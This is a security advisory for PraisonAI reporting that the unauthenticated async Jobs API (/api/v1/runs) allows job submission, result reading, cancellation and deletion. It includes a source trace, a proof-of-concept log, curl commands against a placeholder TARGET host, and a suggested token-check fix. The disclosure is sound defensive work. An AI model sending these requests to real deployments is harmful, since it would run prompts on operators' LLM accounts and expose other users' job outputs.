# [H] PraisonAI: [Auth Bypass] PraisonAI async Jobs API (`/api/v1/runs`) has no authentication — unauthenticated job execution, result theft, cancel and delete

## Summary
Severity: High
Advisory: GHSA-2jgc-f764-c5r2
CVE: CVE-2026-55539
CWE: CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-2jgc-f764-c5r2
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.58

## Details
### Summary
PraisonAI's async **Jobs API** (the FastAPI service in `praisonai/jobs/`) installs its router with no authentication middleware, no router-level dependency, and no per-route auth check. Any caller who can reach the jobs server can submit agent jobs (executed against the operator's configured LLM credentials), list every job in the shared store, read other jobs' results, cancel running jobs, and delete terminal jobs — with no token, cookie, session, or per-job ownership value.
 
The server's default bind is `127.0.0.1`, so remote reach requires an operator to bind a public interface, container-publish, reverse-proxy, or tunnel the service. Once reachable, the primitive is fully pre-authenticated.
 
**This is a distinct, still-unpatched sibling of CVE-2026-44338.** That CVE (GHSA-6rmh-7xcm-cpxj, fixed in 4.6.34) covered only the *legacy Flask* server `src/praisonai/api_server.py`. The fix added `AUTH_ENABLED`/`AUTH_TOKEN`/`check_auth()` to that file and did **not** touch the FastAPI jobs module. At the latest commit (`9fcac3a`, version **4.6.51**) the legacy Flask server is patched but the jobs API remains completely unauthenticated.

## Technical Detail
 
### Source-to-sink trace
 
The FastAPI app includes the jobs router with only CORS middleware — no auth (`server.py`, `create_app`):
 
```python
# src/praisonai/praisonai/jobs/server.py
def create_app(store=None, executor=None, cors_origins=None) -> FastAPI:
    app = FastAPI(title="PraisonAI Jobs API", ...)
    # ... CORS middleware only (allow_headers includes "Authorization",
    #     but CORS is not authentication) ...
    jobs_router = create_router(get_store(), get_executor())
    app.include_router(jobs_router)        # no dependencies=[Depends(...)]
```
 
The router (built inside `create_router()`) registers every job operation with no auth dependency. The only `Header(...)` parameter anywhere is the `Idempotency-Key`, which is deduplication, not authorization:
 
```python
# src/praisonai/praisonai/jobs/router.py
router = APIRouter(prefix="/api/v1/runs", tags=["jobs"])
 
@router.post("",          status_code=202)  async def submit_job(request, response, body, idempotency_key=Header(None, alias="Idempotency-Key")): ...
@router.get("")                              async def list_jobs(status=None, session_id=None, page=1, page_size=20): ...
@router.get("/{job_id}")                     async def get_job_status(job_id): ...
@router.get("/{job_id}/result")              async def get_job_result(job_id): ...
@router.post("/{job_id}/cancel")             async def cancel_job(job_id): ...
@router.delete("/{job_id}", status_code=204) async def delete_job(job_id): ...
@router.get("/{job_id}/stream")              async def stream_job(job_id): ...
```
 
`submit_job()` builds a `Job` from attacker-controlled JSON and submits it. The executor saves and schedules it, and for the default `praisonai` framework runs the attacker prompt against a real agent:
 
```python
# executor.py — submit() -> _execute_job() -> _run_agent() -> _run_praisonai_agents()
agent = Agent(instructions="You are a helpful AI assistant.", output="minimal")
result = await asyncio.to_thread(agent.start, job.prompt)   # attacker-controlled prompt
```
 
The in-memory store has **no owner / principal / user concept**. `list_jobs()` returns the whole store filtered only by caller-supplied `status`/`session_id`:
 
```python
# store.py
async def list_jobs(self, status=None, session_id=None, limit=20, offset=0):
    jobs = list(self._jobs.values())        # global; no owner binding
    if session_id: jobs = [j for j in jobs if j.session_id == session_id]
    ...
```
 
A repository-wide grep of `jobs/` for `Depends|verify|token|authorization|bearer|x-api-key|HTTPBearer|AUTH_ENABLED|check_auth` returns **only** the string `"Authorization"` inside the CORS `allow_headers` list. There is no authentication primitive in the module.
 
### Distinction from CVE-2026-44338 (critical for triage)
 
| | CVE-2026-44338 (already fixed) | This finding |
|---|---|---|
| Component | Legacy Flask `src/praisonai/api_server.py` | FastAPI `praisonai/jobs/` |
| Endpoints | `GET /agents`, `POST /chat` | `/api/v1/runs` (submit/list/get/result/cancel/delete/stream) |
| Root cause | `AUTH_ENABLED=False`, `AUTH_TOKEN=None`, no-op `check_auth()` | No auth dependency, middleware, or token exists at all |
| Status at 4.6.51 | **Patched** (auth enabled by default, token auto-generated, `secrets.compare_digest`) | **Unpatched** |
 
The 4.6.34 remediation hardened only the Flask file. The jobs module is a separate code path that the fix did not reach.
 
### Trigger conditions
 
1. Start the server, e.g. `python -m uvicorn praisonai.jobs.server:create_app --port 8005 --factory`.
2. Make it reachable (`--host 0.0.0.0`, container publish, reverse proxy, tunnel).
3. Send unauthenticated requests to `POST/GET /api/v1/runs`, `GET /api/v1/runs/{id}`, `GET /api/v1/runs/{id}/result`, `POST /api/v1/runs/{id}/cancel`, `DELETE /api/v1/runs/{id}`.

## Proof of Concept
 
Verified dynamically by running the **real** `praisonai.jobs` router, executor, and store over HTTP via FastAPI `TestClient`. The only stub is `praisonaiagents.Agent` (its `.start()` returns canned text), so **no real LLM call and no API credentials were used**. Every request below was sent with **no `Authorization` header, cookie, or token** (the runner asserts `Authorization sent: None` on each).
 
```
## Unauth POST /api/v1/runs (submit job)
   POST /api/v1/runs            -> HTTP 202   Authorization sent: None
   body: {"job_id":"run_de282b4c3f1c","status":"queued", ...}
 
## Unauth GET /api/v1/runs (list every job in shared store)
   GET /api/v1/runs             -> HTTP 200   Authorization sent: None
   body: {"jobs":[{"job_id":"run_de282b4c3f1c","status":"succeeded", ...}], "total":1, ...}
 
## Unauth GET /api/v1/runs/{id}/result (read tenant output)
   GET /api/v1/runs/.../result  -> HTTP 200   Authorization sent: None
   body: {"result":"TENANT-PRIVATE-OUTPUT for prompt='attacker-controlled job'", ...}
 
## Unauth POST /api/v1/runs/{id}/cancel (cancel a RUNNING job)
   t=0.0s status=running ... t=2.0s status=running
   POST /api/v1/runs/.../cancel -> HTTP 200   Authorization sent: None
   after cancel status=cancelled
 
## Unauth DELETE /api/v1/runs/{id} (delete terminal job)
   DELETE /api/v1/runs/...       -> HTTP 204   Authorization sent: None
```
 
Each privileged operation succeeded with zero credentials. (The result endpoint returns a different job's stored output — the cross-job confidentiality primitive.)
 
### Equivalent trigger in a fully installed, network-exposed deployment
 
```bash
python -m uvicorn praisonai.jobs.server:create_app --host 0.0.0.0 --port 8005 --factory
 
curl -sS -X POST http://TARGET:8005/api/v1/runs \
  -H 'Content-Type: application/json' \
  --data-binary '{"prompt":"attacker controlled job","timeout":3600}'
curl -sS http://TARGET:8005/api/v1/runs
curl -sS http://TARGET:8005/api/v1/runs/<job_id>/result
curl -sS -X POST http://TARGET:8005/api/v1/runs/<job_id>/cancel
curl -sS -X DELETE http://TARGET:8005/api/v1/runs/<job_id>
```
 
## Impact
 
- **Execution / cost**: unauthenticated callers run arbitrary prompts against the operator's configured LLM credentials, and can queue long-running jobs (up to `timeout`, default 3600s) consuming CPU, memory, queue slots, and provider billing.
- **Confidentiality**: callers list all jobs (`GET /api/v1/runs`) and read completed results from the shared store — other callers' agent outputs.
- **Integrity / control**: callers cancel running jobs and delete terminal jobs.
The realistic worst case is a reachable jobs endpoint used to run unauthorized prompts on the operator's LLM account, then enumerate and exfiltrate other jobs' outputs.
 
## Suggested Mitigation
 
Mirror the fix already applied to the legacy Flask server (CVE-2026-44338), but for the jobs router:
 
- Add a jobs-server auth token (e.g. `PRAISONAI_JOBS_API_TOKEN`) and require it on every `/api/v1/runs` route via a **router-level dependency**, so future routes inherit protection by default.
- Use constant-time comparison (`hmac.compare_digest` / `secrets.compare_digest`).
- Add per-job ownership / scoped job tokens so one caller cannot list, read, cancel, or delete another caller's jobs.
- Keep `127.0.0.1` as default; warn or refuse when binding a public interface without auth configured.
- Regression tests asserting unauthenticated `POST` / `GET` / `cancel` / `delete` return `401` when auth is enabled.
```python
import hmac, os
from fastapi import Depends, Header, HTTPException
 
def verify_jobs_token(authorization: str | None = Header(None),
                      x_api_key: str | None = Header(None, alias="X-API-Key")):
    expected = os.getenv("PRAISONAI_JOBS_API_TOKEN")
    if not expected:
        raise HTTPException(401, "Jobs API auth is not configured")
    token = x_api_key
    if authorization and authorization.startswith("Bearer "):
        token = authorization[7:]
    if not token or not hmac.compare_digest(token, expected):
        raise HTTPException(401, "Unauthorized")
 
# create_router(...) -> APIRouter(prefix="/api/v1/runs", dependencies=[Depends(verify_jobs_token)])
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2jgc-f764-c5r2
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
